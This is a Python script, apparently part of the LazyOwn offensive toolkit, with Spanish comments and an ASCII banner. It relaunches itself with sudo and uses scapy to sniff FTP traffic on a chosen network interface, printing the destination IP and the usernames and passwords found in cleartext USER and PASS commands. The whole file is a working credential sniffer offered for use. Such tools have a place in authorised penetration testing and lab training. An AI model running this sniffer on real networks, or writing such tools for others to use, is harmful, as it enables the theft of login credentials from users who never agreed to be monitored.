#!/usr/bin/env python3 
#_*_ coding: utf8 _*_
import os
import sys
import signal
import argparse
from scapy.all import *

BANNER = """
██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝ ╚═╝ ╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
[*] Iniciando: LazyOwn Sniffer [;,;]
"""
# Verificar y relanzar con sudo si es necesario
def check_sudo():
    if os.geteuid() != 0:
        print("[S] Este script necesita permisos de superusuario. Relanzando con sudo...")
        args = ['sudo', sys.executable] + sys.argv
        os.execvpe('sudo', args, os.environ)

check_sudo()

# Manejar la interrupción de Ctrl+C
def signal_handler(sig, frame):
    print('\n [->] Captura interrumpida.')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def parse_arguments():
    parser = argparse.ArgumentParser(description="Captura de paquetes en la terminal con navegación.")
    parser.add_argument('-i', '--interface', type=str, required=True, help='Interfaz de red para la captura de paquetes')
    return parser.parse_args()

def sniffer_ftp(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        if pkt[TCP].dport == 21 or pkt[TCP].sport == 21:
            data = pkt[Raw].load.decode('utf-8', errors='ignore')
            if "USER" in data:
                print(f"FTP IP: {pkt[IP].dst}")
                user = data.split(" ")[1].strip()
                print(f"[+] FTP USER: {user}")
            elif "PASS" in data:
                passwd = data.split(" ")[1].strip()
                print(f"[+] FTP PASS: {passwd}")
                
def main():
    args = parse_arguments()
    print(BANNER)

    if args.interface:
        print("[;,;] Lazy FTP Sniffer Runing...")
        sniff(iface=args.interface, filter="tcp and port 21", prn=sniffer_ftp)
    else:
        print("interface must be set")

if __name__ == "__main__":
    main()
